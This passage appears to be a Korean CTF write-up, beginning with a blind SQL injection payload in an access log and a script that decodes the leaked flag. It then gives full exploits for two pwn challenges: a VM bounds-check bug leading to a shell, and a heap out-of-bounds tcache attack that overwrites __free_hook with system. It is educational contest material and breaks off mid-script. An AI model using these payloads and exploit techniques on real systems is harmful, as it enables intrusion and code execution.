192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C3%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
</code></pre></div></div>

<ul>
  <li>access.log를 통해 데이터를 유출한 공격은 Blind SQL Injection 공격인 것을 알 수 있는데 유형이 2가지가 있다.</li>
  <li><code class="highlighter-rouge">0||if(substr(lpad(bin(ord(substr(flag,1,1))),8,0),1,1)=1,1,(select 1 union select 2))</code>을 통해 거짓일 경우에는 500 에러를 발생시켜 Error based SQL Injection 공격을 한 것을 확인할 수 있다.</li>
  <li>두번째 유형은 <code class="highlighter-rouge">0||if(substr(lpad(bin(ord(substr(flag,12,1))),8,0),1,1)=1,sleep(3)=0,1)=0--</code> 을 통해 참일 경우 3초 sleep하여 Time based SQL Injection 공격을 한 것을 확인할 수 있다.</li>
  <li>위 두가지 공격 기법을 통해 공격자가 유출한 데이터를 파악하면 된다. 아래와 같이 스크립트를 작성하여 문제를 해결할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'access.log'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">prevsec</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">first_bypass</span> <span class="o">=</span> <span class="bp">True</span>

<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
    
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">continue</span>
        
    <span class="k">if</span> <span class="s">"OWASP_DirBuster_Project"</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="k">continue</span>
        
    <span class="k">if</span> <span class="s">'union'</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span>
        <span class="k">if</span> <span class="n">x</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="s">'200'</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"1"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"0"</span>
        
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
    
    <span class="k">if</span> <span class="s">'sleep'</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span>
        <span class="k">if</span> <span class="n">first_bypass</span><span class="p">:</span>
            <span class="n">first_bypass</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="n">hour</span><span class="p">,</span> <span class="nb">min</span><span class="p">,</span> <span class="n">sec</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
        <span class="n">allsec</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">sec</span><span class="p">)</span>
        <span class="n">relsec</span> <span class="o">=</span> <span class="n">allsec</span> <span class="o">-</span> <span class="mi">3111</span>
            
        <span class="k">if</span> <span class="p">(</span><span class="n">relsec</span> <span class="o">-</span> <span class="n">prevsec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">2.5</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"1"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"0"</span>
        
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
        
        <span class="n">prevsec</span> <span class="o">=</span> <span class="n">relsec</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h1 id="️-pwn">🖥️ PWN</h1>

<h2 id="bvm-pwn">bvm-pwn</h2>

<hr />

<p><img src="/assets/bob/bob962.png" alt="/assets/bob/bob962.png" /></p>

<p>bvm에서 일부 경계 검사를 수행하지 않는 루틴을 이용하여 stack 영역 변조 및 쉘 획득</p>

<p>bvm opcode를 해석하고 실행하는 과정에서 총 3가지 취약점이 존재한다.</p>

<ol>
  <li><code class="highlighter-rouge">COMP reg, reg</code> opcode에서 left register index에 대해서는 경계 검사를 하지만 right register index는 경계 검사를 하지 않아, 경계를 넘는 register index를 참조하여 255번 반복 비교를 통해 일부 stack 영역을 간접적으로 leak 할 수 있다.</li>
</ol>

<p><img src="/assets/bob/bob963.png" alt="/assets/bob/bob963.png" /></p>

<ol>
  <li><code class="highlighter-rouge">LSHIRT/RSHIFT reg, reg, reg</code>  opcode에서 left register index에 대한 경계 검사를 하지 않아 일부 stack 영역을 덮을 수 있다.</li>
</ol>

<p><img src="/assets/bob/bob964.png" alt="/assets/bob/bob964.png" /></p>

<ol>
  <li><code class="highlighter-rouge">MOVE reg, [reg]</code>  opcode에서 register index에 대한 경계 검사는 하지만 <code class="highlighter-rouge">vm-&gt;reg[right_idx]</code>가 <code class="highlighter-rouge">vm-&gt;size</code>보다 큰지에 대한 검사를 하지않아 일부 stack 영역을 leak 할 수 있다.
3번의 경우 사실 의도하지 않은 취약점으로, 대회 도중 패킷 모니터링을 했을 때 플래그를 획득한 4분 모두 1번 대신 이 취약점을 이용하였다.</li>
</ol>

<p><img src="/assets/bob/bob965.png" alt="/assets/bob/bob965.png" /></p>

<p>위 취약점으로 main return address를 leak하여 libc 주소를 얻고 oneshot gadget를 계산하여 다시 main return address를 덮으면 쉘을 획득할 수 있다.</p>

<p>마지막으로 취약점을 트리거하는 vm code를 작성해야한다.</p>

<p><strong>pwn.asm</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.LEAK_DATA
empty 8

.LEAK_WORD_1
MOVE cx, 0
:LABEL_1
COMP cx, 18x
MOVE ax, cx
ADD cx, 1
JNE LABEL_1
RETURN

.LEAK_WORD_2
MOVE cx, 0
:LABEL_2
COMP cx, 19x
MOVE ax, cx
ADD cx, 1
JNE LABEL_2
RETURN

.LEAK_WORD_3
MOVE cx, 0
:LABEL_3
COMP cx, 20x
MOVE ax, cx
ADD cx, 1
JNE LABEL_3
RETURN

.LEAK_WORD_4
MOVE cx, 0
:LABEL_4
COMP cx, 21x
MOVE ax, cx
ADD cx, 1
JNE LABEL_4
RETURN

.MAIN
// leak libc
CALL LEAK_WORD_1
MOVE bx, SECTION#LEAK_DATA
ADD bx, 0
MOVE [bx], ax

CALL LEAK_WORD_2
MOVE bx, SECTION#LEAK_DATA
ADD bx, 2
MOVE [bx], ax

CALL LEAK_WORD_3
MOVE bx, SECTION#LEAK_DATA
ADD bx, 4
MOVE [bx], ax

CALL LEAK_WORD_4
MOVE bx, SECTION#LEAK_DATA
ADD bx, 6
MOVE [bx], ax

// leak
MOVE cx, 8
MOVE bx, SECTION#LEAK_DATA
MOVE ax, 1
SYSCALL

// write SECTION#LEAK_DATA
MOVE ax, 0
SYSCALL

// overwrite
MOVE bx, 0
MOVE ax, SECTION#LEAK_DATA
MOVE dx, [ax]
LSHIFT 18x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 19x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 20x, dx, bx

ADD ax, 2
MOVE dx, [ax]
LSHIFT 21x, dx, bx
RETURN
</code></pre></div></div>

<p>pwn.asm에서 표현된 18x, 19x 등의 레지스터는 원래는 존재하지 않는 레지스터로, return address를 가리키도록 조작된 opcode이다.</p>

<p><strong>exploit poc</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">hashlib</span><span class="p">,</span> <span class="n">secrets</span><span class="p">,</span> <span class="n">re</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">12001</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
<span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'\"[^)]*\"'</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
<span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="o">=</span> <span class="n">k</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"parsed (k, v) = ({}, {})"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">))</span>

<span class="n">pg</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"PoW"</span><span class="p">)</span>
<span class="n">pg</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"solving ..."</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">k</span> <span class="o">+</span> <span class="n">x</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">v</span><span class="p">:</span>
        <span class="n">pg</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"solved [x = {}]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
        <span class="k">break</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"QlZNAAYSABoALAA+AFAAYgAFAAAAAAAAAAABAgAAGQISEQACAgIBAAweAA4BAgAAGQITEQACAgIBAAwwAA4BAgAAGQIUEQACAgIBAAxCAA4BAgAAGQIVEQACAgIBAAxUAA4NGgBBAQACAQAAMQEADSwAQQEAAgECADEBAA0+AEEBAAIBBAAxAQANUABBAQACAQYAMQEAAQIIAEEBAAEAAQAPAQAAAA8BAQAAQQAAIQMABxIDAQIAAgAhAwAHEwMBAgACACEDAAcUAwECAAIAIQMABxUDAQ4="</span>
<span class="c1"># payload = b64e(open("pwn.bvm", "rb").read()
</span><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"x = "</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"loading ...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x021b97</span> <span class="c1"># libc_base
</span><span class="n">r</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc: {:x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x4f365</span><span class="p">))</span> <span class="c1"># oneshot
</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># cat flag
# bob{B0undary_cheCK_1s_e2sy_T0_f0rg2t}
</span></code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h2 id="cluster_shell">cluster_shell</h2>

<hr />

<p><img src="/assets/bob/bob966.png" alt="/assets/bob/bob966.png" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>libc 2.31 heap oob문제
</code></pre></div></div>
<ul>
  <li>vim처럼 만든 메모장 기능과 유사 쉘 프롬프트</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh# <span class="nb">help</span>
<span class="o">========================================</span>
<span class="nb">help</span>    - Help
<span class="nb">ls</span>      - List of files
<span class="nb">cat</span>     - Print the contents
<span class="nb">rm</span>      - Remove file
vim     - Text editor
<span class="o">========================================</span>
sh# <span class="nb">ls</span>
 - 1
sh# <span class="nb">cat </span>1

 aaaa

sh# vim 1
<span class="c">##################</span>
<span class="c">#_aaaa...........#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">#................#</span>
<span class="c">##################</span>
</code></pre></div></div>

<ul>
  <li>vim으로 파일을 하나 만들때 마다 힙에 0x110크기의 청크를 할당한다. <strong>rm</strong>으로 삭제할때 마다 free로 청크 해제 가능. 딱 봐도 메모리에 뭔가 쓰거나 할 수 있는게 <strong>vim</strong>기능밖에 없기 때문에 vim코드로 간다.</li>
  <li>sub_1980가 <strong>vim</strong>코드이고, 안의 분기에 sub_14E2가 <strong>vim</strong>모드에서 커서를 움직이는 코드. switch문으로 jmp로 해당 루틴으로 들어간다. sub_149E가 oob방지를 위한 boundary check함수</li>
</ul>

<p><img src="/assets/bob/bob967.png" alt="/assets/bob/bob967.png" /></p>

<ul>
  <li>qword_5058이 vim모드에서 커서의 위치이다. 커서의 위치가 움직이는 코드에는 모두 위 boundary check함수가 있어야 한다.</li>
</ul>

<p><img src="/assets/bob/bob968.png" alt="/assets/bob/bob968.png" /></p>

<ul>
  <li>하지만 같은 영역내에 boundary check함수 없이 커서의 위치를 조작하는 기능이 있다. 이를 이용해 vim note내에서 oob취약점을 트리거 하여 힙 영역내에 청크를 조작할 수 있다.</li>
  <li>switch문을 분석하면 jmp코드를 어디로 탈지 테이블이 있다.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x800153c:   lea    0x1ac5<span class="o">(</span>%rip<span class="o">)</span>,%rdx        <span class="c"># 0x8003008</span>
<span class="o">=&gt;</span> 0x8001543:   add    %rdx,%rax
   0x8001546:   notrack jmpq <span class="k">*</span>%rax
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">0x8003008</code> + [테이블 데이터]로 점프를 타는데 점프를 탈 곳을 위에서 찾은 취약한 함수가 있는곳을 찾는다. 찾는 값은 0x8003008 + X = 0x8001608이므로</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> hex<span class="o">(</span>0x8001608-0x8003008&amp;0xffffffff<span class="o">)</span>
<span class="s1">'0xffffe600'</span>
</code></pre></div></div>

<ul>
  <li>해당 값은 0x8003008[0x27]번째에 있다.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/128wx 0x8003008
0x8003008:      0xffffe640      0xffffe64e      0xffffe64e      0xffffe64e
0x8003018:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003028:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003038:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003048:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003058:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003068:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003078:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003088:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003098:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe600
0x80030a8:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x80030b8:      0xffffe64e      0xffffe64e      0xffffe541      0xffffe5f2
0x80030c8:      0xffffe56f      0xffffe59d      0xffffe5cb      0xffffe64e
0x80030d8:      0xffffe64e      0xffffe620      0x6f4e0020      0x6c696620
<span class="o">(</span>gdb<span class="o">)</span> x/wx 0x8003008+0x27<span class="k">*</span>4
0x80030a4:      0xffffe600
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000001513                 movzx   eax, byte ptr <span class="o">[</span>rbp-9]
.text:0000000000001517                 movsx   eax, al
.text:000000000000151A                 sub     eax, 3Ah <span class="p">;</span> <span class="s1">':'</span>
.text:000000000000151D                 cmp     eax, 35h <span class="p">;</span> <span class="s1">'5'</span>
.text:0000000000001520                 ja      loc_1656
.text:0000000000001526                 mov     eax, eax
</code></pre></div></div>

<ul>
  <li>switch계산에서 [사용자의 입력] - 0x3a를 하니 더하면 문자 <code class="highlighter-rouge">a</code>가 된다.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> chr<span class="o">(</span>0x27+0x3a<span class="o">)</span>
<span class="s1">'a'</span>
</code></pre></div></div>

<ul>
  <li>vim모드에서 a문자를 입력할 시 다음과 같은 코드의 실행을 알게 된다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mov</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">cs</span><span class="o">:</span><span class="n">qword_5058</span>
<span class="n">add</span>     <span class="n">rax</span><span class="p">,</span> <span class="mi">1</span>
<span class="n">mov</span>     <span class="n">cs</span><span class="o">:</span><span class="n">qword_5058</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">ABCD0001h</span>
<span class="n">mov</span>     <span class="n">cs</span><span class="o">:</span><span class="n">qword_5010</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">jmp</span>     <span class="kt">short</span> <span class="n">loc_1663</span>
</code></pre></div></div>

<ul>
  <li>이 뒤부터는 oob를 이용해 코드를 볼 필요 없이 메모리만 보면서 취약점의 트리거가 가능하다.</li>
  <li>다양한 방법으로 취약점을 트리거 할 수 있지만 나는 tcache bin attack으로 <code class="highlighter-rouge">__free_hook</code>에 <code class="highlighter-rouge">system</code>을 덮어서 트리거하였다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x481</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>heap chunk 6개 할당하고 1번 힙의 크기를 0x480으로 바꿔 unsorted bin으로 바꾸고 해제하여 libc의 주소를 바로 구할 수 있다. <code class="highlighter-rouge">oob</code>는 0번째 힙 청크의 바로 뒤에 적기 시작하는 함수이다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x110</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x361</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="err">'</span><span class="n">__free_hook</span><span class="err">'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>4번 3번 청크를 해제해 tcache bin을 만들고 위에서 leak한 libc의 주소를 가져와 oob취약점으로 tcache bin의 다음 할당될 공간을 바꾼다. tcache bin은 사이즈 체크같은 귀찮은게 없어서 편하다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="err">'</span><span class="n">AA</span><span class="err">'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="n">f</span><span class="s">"vim /bin/sh"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">b</span><span class="s">"i"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="err">'</span><span class="n">system</span><span class="err">'</span><span class="p">]))</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="err">'</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">__free_hook</code>을 <code class="highlighter-rouge">system</code>으로 덮고 호출.</li>
</ul>

<h3 id="exploit">exploit</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="s">'''
cluster_shell

in honestly, this is not has a relationship the clustering.

nc pwn.wwwlk.kr 13337

libc: http://pwn.wwwlk.kr/libc.so.6
md5: 10fdeb77eea525914332769e9cd912ae

binary: http://pwn.wwwlk.kr/cluster_shell
md5: a5960d98860dc3d5bf82ba82b0fe6dca
'''</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = 'debug'
</span>
<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"vim </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"rm </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">oob</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"vim </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"j"</span> <span class="o">*</span> <span class="mh">0xf</span> <span class="o">+</span> <span class="s">b"l"</span> <span class="o">*</span> <span class="mh">0xf</span> <span class="o">+</span> <span class="s">b'a'</span> <span class="o">+</span> <span class="n">value</span><span class="p">)</span>
   <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
codebase
c
'''</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./a.out"</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

